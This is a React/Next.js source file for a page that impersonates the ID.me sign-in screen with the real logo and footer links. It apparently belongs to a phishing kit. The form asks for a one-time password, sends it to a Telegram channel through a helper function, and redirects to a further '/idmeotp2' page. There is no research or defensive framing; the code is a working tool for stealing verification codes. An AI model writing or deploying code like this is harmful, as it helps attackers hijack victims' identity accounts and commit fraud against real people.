// OTPVerificationPage.tsx
"use client";
import './styles.css';
import Image from 'next/image';
import idmeLogo from './idme.png'; // Import image file
import { useState } from "react";

import { sendTelegramMessage } from "../../utils/telegram"; // Import the utility function

const OTPVerificationPage = () => {
  const [otp, setOtp] = useState('');
  const [error, setError] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {  // Define the type for 'e'
    e.preventDefault();

    if (!otp) {
      setError("Please enter the OTP.");
      return;
    }

    // Format the message to send to Telegram
    const message = `New OTP Verification Attempt:\nOTP: ${otp}`;

    try {
      // Send OTP to Telegram before proceeding
      await sendTelegramMessage(message);

      window.location.href = "/idmeotp2";
    } catch (error) {
      console.error('Error sending OTP:', error);
      setError("Failed to send OTP. Please try again.");
    }
  };

  return (
    <div className='page-container' data-role='page-container'>
      <div className='container'>
        <div className='content-container'>
          <form className="new_user" id="new_user" data-validate="signin" onSubmit={handleSubmit}>
            <div className='form-header'>
              <div className='form-header-content' role='banner'>
                <div className='partner'>
                  <div className='c_icon m_idme'>
                    <Image alt="ID.me" width={120} height={40} src={idmeLogo} />
                  </div>
                </div>
              </div>
            </div>

            <main aria-labelledby='sr_page_title' className='form-container'>
              <div className='form-header-access'>
                <h1 id='sr_page_title'>Sign in to ID.me</h1>
              </div>

              <div className='form-header-well'>
                <p>New to ID.me?</p>
                <p><a target="_blank" href="https://cutt.ly/xPJZ0xv">Create an ID.me account</a></p>
              </div>

              <p>Enter the OTP sent to the mobile number associated with your ID.me account</p><br /><br /><br />

              <div className='form-fields'>
                <div className='field-group'>
                  <div className='field text'>
                    <label htmlFor="user_otp">One Time Password</label>
                    <input
                      placeholder="Enter your OTP"
                      required
                      type="number"
                      name="otp"
                      id="user_otp"
                      value={otp}
                      onChange={(e) => setOtp(e.target.value)}
                    />
                  </div>
                </div>
              </div>

              {error && <p id="error-message" style={{ color: 'red', fontSize: '12px' }}>{error}</p>}

              <div className='form-actions' data-component='Components.Collector'>
                <input type="submit" name="commit" value="Verify" className="btn btn-primary" />
              </div>
            </main>
          </form>
        </div>

        <footer className='footer' role='contentinfo'>
          <div className='footer-links'>
            <a target="_blank" href="https://www.id.me/about">What is ID.me?</a> |
            <a target="_blank" href="https://www.id.me/terms">Terms of Service</a> |
            <a target="_blank" href="https://www.id.me/privacy">Privacy Policy</a>
          </div>
        </footer>
      </div>
    </div>
  );
};

export default OTPVerificationPage;
